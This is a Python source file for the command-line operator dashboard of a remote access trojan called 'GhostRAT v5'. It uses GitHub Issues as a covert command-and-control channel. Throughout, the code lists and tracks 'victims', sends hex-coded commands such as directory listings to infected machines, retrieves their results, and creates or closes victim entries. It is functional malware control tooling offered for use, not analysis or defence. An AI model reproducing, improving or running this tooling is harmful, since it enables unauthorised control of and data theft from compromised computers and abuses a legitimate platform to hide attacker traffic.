#!/usr/bin/env python3
"""
GhostRAT v5 — GitHub Issues Dashboard
=======================================

CLI dashboard for managing GhostRAT v5 victims via GitHub Issues.

Usage::

    python github_dashboard.py --repo giorgipirveli/ghostrat-v5 --token <PAT> list
    python github_dashboard.py --repo giorgipirveli/ghostrat-v5 --token <PAT> status victim-01
    python github_dashboard.py --repo giorgipirveli/ghostrat-v5 --token <PAT> send victim-01 05 "dir C:\\"
    python github_dashboard.py --repo giorgipirveli/ghostrat-v5 --token <PAT> results victim-01
    python github_dashboard.py --repo giorgipirveli/ghostrat-v5 --token <PAT> close victim-01

Options:
    --repo OWNER/NAME     GitHub repository (owner/repo)
    --token GH_TOKEN      GitHub personal access token
    --config FILE         Load config from JSON file (alternative to --repo/--token)
    --label LABEL         Issue label to identify victims (default: ghostrat-v5)
    --verbose             Enable debug logging
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import sys
from typing import Any, Dict, List, Optional

# Ensure the project root is on sys.path so c2 imports resolve
_project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _project_root not in sys.path:
    sys.path.insert(0, _project_root)

from c2.config import C2Config  # noqa: E402
from c2.github_issues import GitHubIssuesC2  # noqa: E402

logger = logging.getLogger("GhostRATv5.Dashboard")

# ---------------------------------------------------------------------------
# Colour helpers (ANSI)
# ---------------------------------------------------------------------------

class _C:
    """ANSI colour codes."""
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def _colourize(text: str, color: str) -> str:
    """Wrap *text* in ANSI colour, stripping if stdout is not a tty."""
    if not sys.stdout.isatty():
        return text
    return f"{color}{text}{_C.RESET}"


# ---------------------------------------------------------------------------
# Command handlers
# ---------------------------------------------------------------------------

def cmd_list(c2: GitHubIssuesC2, **kwargs: Any) -> int:
    """List all victim Issues."""
    issues = c2.list_victims()

    if not issues:
        print(_colourize("No victim issues found.", _C.YELLOW))
        return 0

    print(_colourize(f"\n{'='*60}", _C.BOLD))
    print(_colourize("  GhostRAT v5 — Victim List", _C.BOLD + _C.CYAN))
    print(_colourize(f"{'='*60}", _C.BOLD))
    print()

    for issue in issues:
        vid = ""
        state = issue.get("state", "?")
        num = issue.get("number", "?")
        title = issue.get("title", "")
        created = issue.get("created_at", "?")

        # Try to extract victim_id from title
        for part in title.split():
            if part.startswith("GhostRAT"):
                continue
            vid = part
            break
        if not vid:
            vid = title

        state_color = _C.GREEN if state == "open" else _C.RED
        print(
            f"  {_C.BOLD}#{num}{_C.RESET}  "
            f"{_colourize(vid, _C.BOLD)}  "
            f"({_colourize(state, state_color)})  "
            f"Created: {created}"
        )

    print(f"\n  Total: {len(issues)} victim(s)\n")
    return 0


def cmd_status(c2: GitHubIssuesC2, victim_id: str, **kwargs: Any) -> int:
    """Show victim status."""
    try:
        status = c2.get_victim_status(victim_id)
    except RuntimeError as exc:
        print(_colourize(f"Error: {exc}", _C.RED))
        return 1

    print(_colourize(f"\n{'='*60}", _C.BOLD))
    print(_colourize(f"  Victim: {victim_id}", _C.BOLD + _C.CYAN))
    print(_colourize(f"{'='*60}", _C.BOLD))
    print()

    for key, value in status.items():
        if key == "metadata":
            print(_colourize("  Metadata:", _C.BOLD))
            for mk, mv in value.items():
                print(f"    {mk}: {mv}")
        else:
            label = key.replace("_", " ").title()
            print(f"  {label}: {value}")

    print()
    return 0


def cmd_send(
    c2: GitHubIssuesC2,
    victim_id: str,
    cmd_type: str,
    data: str = "",
    **kwargs: Any,
) -> int:
    """Send a command to a victim."""
    try:
        cmd_int = int(cmd_type, 16)
    except ValueError:
        print(_colourize(f"Invalid command type: {cmd_type} (must be hex, e.g. 05)", _C.RED))
        return 1

    try:
        comment = c2.send_command(victim_id, cmd_int, data)
        print(_colourize("Command sent successfully.", _C.GREEN))
        print(f"  Victim:   {victim_id}")
        print(f"  Type:     0x{cmd_int:02X}")
        if data:
            print(f"  Data:     {data}")
        print(f"  Comment:  #{comment.get('id', '?')}")
        print(f"  URL:      {comment.get('html_url', 'N/A')}")
        return 0
    except RuntimeError as exc:
        print(_colourize(f"Error sending command: {exc}", _C.RED))
        return 1


def cmd_results(c2: GitHubIssuesC2, victim_id: str, **kwargs: Any) -> int:
    """Show latest results for a victim."""
    try:
        status = c2.get_victim_status(victim_id)
    except RuntimeError as exc:
        print(_colourize(f"Error: {exc}", _C.RED))
        return 1

    print(_colourize(f"\n{'='*60}", _C.BOLD))
    print(_colourize(f"  Results for: {victim_id}", _C.BOLD + _C.CYAN))
    print(_colourize(f"{'='*60}", _C.BOLD))
    print()

    issue_num = status.get("issue_number", "?")
    print(f"  Issue:  #{issue_num}")
    print(f"  State:  {status.get('issue_state', '?')}")
    print(f"  Status: {status.get('status', '?')}")
    print(f"  Last heartbeat: {status.get('last_heartbeat', 'never')}")
    print(f"  Results received: {status.get('results_received', '0')}")
    print()

    # Fetch the raw issue to get the body
    try:
        issue = c2._get_issue_by_title(victim_id)
        body = issue.get("body", "")
        if "---" in body:
            top, meta = body.split("---", 1)
            # Extract result section (between --- markers in top)
            result_parts = top.split("---")
            if len(result_parts) >= 2:
                result_text = result_parts[-2].strip() if len(result_parts) >= 3 else result_parts[-1].strip()
                if result_text and not result_text.startswith("# Victim"):
                    print(_colourize("  Latest result:", _C.BOLD))
                    print(f"  {_C.CYAN}{result_text}{_C.RESET}")
                else:
                    print("  No results yet.")
            else:
                print("  No results yet.")
        else:
            print("  No results yet.")
    except RuntimeError as exc:
        print(_colourize(f"Could not fetch issue: {exc}", _C.YELLOW))

    print()
    return 0


def cmd_close(c2: GitHubIssuesC2, victim_id: str, **kwargs: Any) -> int:
    """Close a victim's Issue."""
    try:
        issue = c2.close_victim_issue(victim_id)
        state = issue.get("state", "?")
        print(_colourize(f"Victim issue closed: {victim_id} (#{issue.get('number', '?')})", _C.GREEN))
        return 0
    except RuntimeError as exc:
        print(_colourize(f"Error closing issue: {exc}", _C.RED))
        return 1


def cmd_create(
    c2: GitHubIssuesC2,
    victim_id: str,
    victim_name: str = "",
    **kwargs: Any,
) -> int:
    """Create a new victim issue."""
    try:
        issue = c2.create_victim_issue(victim_id, victim_name)
        print(_colourize(f"Victim created: {victim_id} (#{issue.get('number', '?')})", _C.GREEN))
        print(f"  Title:  {issue.get('title', '?')}")
        print(f"  URL:    {issue.get('html_url', 'N/A')}")
        return 0
    except RuntimeError as exc:
        print(_colourize(f"Error creating victim: {exc}", _C.RED))
        return 1


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    """Build the CLI argument parser."""
    parser = argparse.ArgumentParser(
        prog="github_dashboard",
        description="GhostRAT v5 — GitHub Issues Dashboard",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --repo giorgipirveli/ghostrat-v5 --token GHP_TOKEN list
  %(prog)s --repo giorgipirveli/ghostrat-v5 --token GHP_TOKEN status victim-01
  %(prog)s --repo giorgipirveli/ghostrat-v5 --token GHP_TOKEN send victim-01 05 "dir C:\\\\"
  %(prog)s --repo giorgipirveli/ghostrat-v5 --token GHP_TOKEN results victim-01
  %(prog)s --repo giorgipirveli/ghostrat-v5 --token GHP_TOKEN close victim-01
  %(prog)s --repo giorgipirveli/ghostrat-v5 --token GHP_TOKEN create victim-02 "Workstation"
        """,
    )

    parser.add_argument(
        "--repo",
        metavar="OWNER/NAME",
        help="GitHub repository (owner/repo), e.g. giorgipirveli/ghostrat-v5",
    )
    parser.add_argument(
        "--token",
        metavar="GH_TOKEN",
        help="GitHub personal access token (PAT)",
    )
    parser.add_argument(
        "--config",
        metavar="FILE",
        help="Load config from JSON file (alternative to --repo/--token)",
    )
    parser.add_argument(
        "--label",
        default="ghostrat-v5",
        help="Issue label to identify victims (default: ghostrat-v5)",
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable debug logging",
    )

    sub = parser.add_subparsers(dest="command", help="Available commands")

    sub.add_parser("list", help="List all victim Issues")

    status_p = sub.add_parser("status", help="Show victim status")
    status_p.add_argument("victim_id", help="Victim identifier")

    send_p = sub.add_parser("send", help="Send command to victim")
    send_p.add_argument("victim_id", help="Victim identifier")
    send_p.add_argument("cmd_type", help="Command type in hex (e.g. 05, 0x05)")
    send_p.add_argument("data", nargs="?", default="", help="Optional command data")

    results_p = sub.add_parser("results", help="Show latest results")
    results_p.add_argument("victim_id", help="Victim identifier")

    close_p = sub.add_parser("close", help="Close victim Issue")
    close_p.add_argument("victim_id", help="Victim identifier")

    create_p = sub.add_parser("create", help="Create new victim Issue")
    create_p.add_argument("victim_id", help="Victim identifier")
    create_p.add_argument("victim_name", nargs="?", default="", help="Human-readable name")

    return parser


def main(argv: Optional[List[str]] = None) -> int:
    """Entry point."""
    parser = build_parser()
    args = parser.parse_args(argv)

    # Logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    if not args.command:
        parser.print_help()
        return 1

    # Build C2 client
    if args.config:
        config = C2Config.load_from_file(args.config)
    else:
        if not args.repo or not args.token:
            print(
                _colourize(
                    "Error: --repo and --token are required (or use --config)",
                    _C.RED,
                )
            )
            return 1
        parts = args.repo.split("/")
        if len(parts) != 2:
            print(_colourize("Error: --repo must be in OWNER/NAME format", _C.RED))
            return 1
        config = C2Config(
            github_repo_owner=parts[0],
            github_repo_name=parts[1],
            github_token=args.token,
        )

    if not config.has_github:
        print(_colourize("Error: GitHub repo_owner, repo_name, and token are required", _C.RED))
        return 1

    c2 = GitHubIssuesC2(
        config.github_repo_owner,
        config.github_repo_name,
        config.github_token,
        crypto_key=config.crypto_key,
    )

    # Dispatch
    dispatch = {
        "list": cmd_list,
        "status": cmd_status,
        "send": cmd_send,
        "results": cmd_results,
        "close": cmd_close,
        "create": cmd_create,
    }

    handler = dispatch.get(args.command)
    if not handler:
        parser.print_help()
        return 1

    # Build kwargs for the handler
    kwargs: Dict[str, Any] = {}
    if args.command == "send":
        kwargs["victim_id"] = args.victim_id
        kwargs["cmd_type"] = args.cmd_type
        kwargs["data"] = args.data
    elif args.command in ("status", "results", "close"):
        kwargs["victim_id"] = args.victim_id
    elif args.command == "create":
        kwargs["victim_id"] = args.victim_id
        kwargs["victim_name"] = args.victim_name or ""
    else:
        # list — no extra args
        pass

    return handler(c2, **kwargs)


if __name__ == "__main__":
    sys.exit(main())
